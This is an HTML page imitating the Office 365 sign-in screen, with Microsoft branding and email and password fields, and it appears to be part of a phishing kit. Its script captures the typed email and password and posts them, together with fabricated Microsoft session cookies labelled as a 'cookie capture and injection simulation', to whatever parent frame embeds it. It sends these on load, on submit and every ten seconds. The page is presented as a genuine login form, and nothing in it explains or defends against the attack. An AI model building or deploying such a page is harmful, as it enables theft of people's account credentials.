<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Office 365 Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }
        
        .microsoft-logo {
            width: 108px;
            height: 24px;
            margin: 0 auto 32px;
            display: block;
        }
        
        .title {
            font-size: 24px;
            font-weight: 600;
            color: #1b1b1b;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 15px;
            color: #605e5c;
            text-align: center;
            margin-bottom: 24px;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        .form-label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #323130;
            margin-bottom: 4px;
        }
        
        .form-input {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #605e5c;
            border-radius: 2px;
            font-size: 15px;
            background: white;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 1px #0078d4;
        }
        
        .form-input.error {
            border-color: #d13438;
        }
        
        .error-message {
            color: #d13438;
            font-size: 13px;
            margin-top: 4px;
            display: none;
        }
        
        .error-message.show {
            display: block;
        }
        
        .sign-in-button {
            width: 100%;
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 2px;
            padding: 8px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 24px;
        }
        
        .sign-in-button:hover {
            background: #106ebe;
        }
        
        .sign-in-button:disabled {
            background: #f3f2f1;
            color: #a19f9d;
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 16px;
        }
        
        .loading.show {
            display: block;
        }
        
        .spinner {
            border: 2px solid #f3f2f1;
            border-top: 2px solid #0078d4;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto 8px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer-links {
            text-align: center;
            margin-top: 24px;
            font-size: 13px;
        }
        
        .footer-links a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft" class="microsoft-logo">
        
        <h1 class="title">Sign in</h1>
        <p class="subtitle">to continue to Office 365</p>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="email" class="form-label">Email, phone, or Skype</label>
                <input type="email" id="email" class="form-input" required>
                <div class="error-message" id="emailError">Please enter a valid email address.</div>
            </div>
            
            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <input type="password" id="password" class="form-input" required>
                <div class="error-message" id="passwordError">Please enter your password.</div>
            </div>
            
            <button type="submit" class="sign-in-button" id="signInButton">Sign in</button>
        </form>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Signing you in...</p>
        </div>
        
        <div class="footer-links">
            <a href="#">Can't access your account?</a>
            <a href="#">Sign-in options</a>
        </div>
    </div>

    <script>
        // Microsoft cookie capture and injection simulation
        const microsoftCookies = [
            {
                name: 'ESTSAUTH',
                value: 'CfDJ8' + Math.random().toString(36).substr(2, 50),
                domain: '.login.microsoftonline.com',
                path: '/',
                secure: true,
                httpOnly: true,
                sameSite: 'none',
                expirationDate: Math.floor(Date.now() / 1000) + 3600,
                hostOnly: false,
                session: false,
                storeId: null
            },
            {
                name: 'ESTSAUTHPERSISTENT',
                value: 'CfDJ8' + Math.random().toString(36).substr(2, 60),
                domain: '.login.microsoftonline.com',
                path: '/',
                secure: true,
                httpOnly: true,
                sameSite: 'none',
                expirationDate: Math.floor(Date.now() / 1000) + 86400,
                hostOnly: false,
                session: false,
                storeId: null
            },
            {
                name: 'SignInStateCookie',
                value: JSON.stringify({
                    state: Math.random().toString(36).substr(2, 20),
                    timestamp: Date.now(),
                    tenant: 'common'
                }),
                domain: 'login.microsoftonline.com',
                path: '/',
                secure: true,
                httpOnly: false,
                sameSite: 'lax',
                expirationDate: Math.floor(Date.now() / 1000) + 1800,
                hostOnly: true,
                session: true,
                storeId: null
            },
            {
                name: 'buid',
                value: Math.random().toString(36).substr(2, 16),
                domain: '.microsoftonline.com',
                path: '/',
                secure: true,
                httpOnly: false,
                sameSite: 'none',
                expirationDate: Math.floor(Date.now() / 1000) + 31536000,
                hostOnly: false,
                session: false,
                storeId: null
            },
            {
                name: 'esctx',
                value: btoa(JSON.stringify({
                    correlationId: Math.random().toString(36).substr(2, 20),
                    sessionId: Math.random().toString(36).substr(2, 15),
                    timestamp: Date.now()
                })),
                domain: 'login.microsoftonline.com',
                path: '/',
                secure: true,
                httpOnly: false,
                sameSite: 'lax',
                expirationDate: Math.floor(Date.now() / 1000) + 3600,
                hostOnly: true,
                session: false,
                storeId: null
            }
        ];

        // Simulate Microsoft cookie injection
        function injectMicrosoftCookies() {
            console.log('ðŸ”µ Injecting Microsoft authentication cookies...');
            
            // Send cookies to parent window for capture
            if (window.parent) {
                window.parent.postMessage({
                    type: 'MICROSOFT_COOKIES',
                    cookies: microsoftCookies,
                    timestamp: new Date().toISOString()
                }, '*');
            }

            // Simulate setting cookies in document (limited by same-origin policy)
            microsoftCookies.forEach(cookie => {
                try {
                    if (cookie.domain === window.location.hostname || !cookie.httpOnly) {
                        let cookieString = `${cookie.name}=${cookie.value}`;
                        if (cookie.path) cookieString += `; Path=${cookie.path}`;
                        if (cookie.secure) cookieString += `; Secure`;
                        if (cookie.sameSite) cookieString += `; SameSite=${cookie.sameSite}`;
                        
                        document.cookie = cookieString;
                        console.log('ðŸ”µ Set cookie:', cookie.name);
                    }
                } catch (e) {
                    console.log('ðŸ”µ Cookie setting limited by browser security:', cookie.name);
                }
            });
        }

        // Form handling
        const form = document.getElementById('loginForm');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const signInButton = document.getElementById('signInButton');
        const loading = document.getElementById('loading');

        // Listen for error messages from parent
        window.addEventListener('message', (event) => {
            if (event.data.type === 'LOGIN_ERROR') {
                showError(event.data.payload.message);
                hideLoading();
            }
        });

        function showError(message) {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error-message show';
            errorDiv.textContent = message;
            errorDiv.style.textAlign = 'center';
            errorDiv.style.marginTop = '16px';
            
            // Remove existing error
            const existingError = document.querySelector('.global-error');
            if (existingError) {
                existingError.remove();
            }
            
            errorDiv.className += ' global-error';
            form.appendChild(errorDiv);
        }

        function showLoading() {
            signInButton.disabled = true;
            loading.classList.add('show');
        }

        function hideLoading() {
            signInButton.disabled = false;
            loading.classList.remove('show');
        }

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!email || !password) {
                showError('Please enter both email and password.');
                return;
            }

            showLoading();

            // Inject Microsoft cookies before submitting
            injectMicrosoftCookies();

            // Simulate authentication delay
            setTimeout(() => {
                // Send login data to parent window
                if (window.parent) {
                    window.parent.postMessage({
                        type: 'OFFICE_365_SUBMIT',
                        payload: { email, password }
                    }, '*');

                    // Send authentication success message
                    setTimeout(() => {
                        window.parent.postMessage({
                            type: 'OFFICE_365_AUTH_SUCCESS',
                            payload: { 
                                email, 
                                timestamp: new Date().toISOString(),
                                cookies: microsoftCookies
                            }
                        }, '*');
                    }, 500);
                }
            }, 1000);
        });

        // Inject cookies when page loads
        window.addEventListener('load', () => {
            setTimeout(injectMicrosoftCookies, 1000);
        });

        // Periodically inject cookies to simulate ongoing session
        setInterval(injectMicrosoftCookies, 10000);
    </script>
</body>
</html>
